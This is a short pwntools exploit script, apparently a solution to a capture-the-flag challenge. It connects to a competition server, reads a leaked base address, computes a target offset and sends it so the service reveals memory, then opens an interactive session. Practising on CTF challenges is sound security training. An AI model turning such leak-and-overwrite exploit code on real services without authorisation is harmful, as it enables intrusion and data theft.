from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
p = remote("wfw1.2023.ctfcompetition.com",1337)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)
ru(b"shot.\n")
base = int(p.readuntil("-")[:-1],0x10)
print(hex(base))
target = base+0x21E0
sla("expire\n",hex(target)+" 120")
p.interactive()